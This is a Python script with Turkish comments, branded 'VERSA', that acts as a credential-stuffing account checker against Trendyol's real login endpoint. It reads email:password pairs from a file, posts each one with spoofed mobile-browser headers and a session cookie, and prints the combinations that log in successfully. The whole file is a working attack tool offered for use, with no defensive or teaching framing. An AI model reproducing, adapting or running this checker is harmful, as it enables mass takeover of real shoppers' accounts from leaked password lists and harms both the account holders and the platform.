import requests
import json
from colorama import Fore, Style, init

# Colorama'yı başlat
init(autoreset=True)

# VERSA logosu
def print_logo():
    logo = """
  V       E       R       S       A
  V       E       R       S       A
  V       E       R       S       A
    """
    print(Fore.BLUE + Style.BRIGHT + logo)

def check_accounts(file_path):
    url = "https://auth.trendyol.com/login"

    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'application-id': "7",
        'sec-ch-ua-platform': "\"Android\"",
        'storefront-id': "1",
        'sec-ch-ua': "\"Google Chrome\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
        'sec-ch-ua-mobile': "?0",
        'culture': "tr-TR",
        'content-type': "application/json;charset=UTF-8",
        'origin': "https://auth.trendyol.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://auth.trendyol.com/static/fragment?application-id=7&storefront-id=1&culture=tr-TR&language=tr&debug=false",
        'accept-language': "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        'priority': "u=1, i",
        'Cookie': "anonUserId=da5f0f00-8a59-11ef-9ed2-99b241f7b34e; platform=mweb; m=1; sm=1; ..."
    }

    try:
        with open(file_path, 'r') as file:
            accounts = file.readlines()
    except FileNotFoundError:
        print(Fore.RED + "Hesap dosyası bulunamadı. Lütfen geçerli bir dosya yolu girin.")
        return

    for account in accounts:
        # E-posta ve şifreyi ayır
        email, password = account.strip().split(':')

        payload = json.dumps({
            "email": email,
            "password": password
        })

        try:
            response = requests.post(url, data=payload, headers=headers)
            # Yanıtı kontrol et
            if response.status_code == 200:
                response_data = response.json()
                if 'success' in response_data and response_data['success']:
                    print(Fore.GREEN + Style.BRIGHT + f"Giren Hesap: {email}:{password}")
                else:
                    print(Fore.YELLOW + Style.BRIGHT + f"Başarısız: {email}:{password}")
            else:
                print(Fore.RED + f"Sunucu hatası: {email}:{password} (Kod: {response.status_code})")
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"İstek hatası: {email}:{password} ({e})")

# Logo ilk önce yazdır
print_logo()

# Kullanıcıdan dosya yolunu al
account_file_path = input(Fore.CYAN + Style.BRIGHT + "Hesapların bulunduğu dosyanın tam yolunu girin: ")
check_accounts(account_file_path)
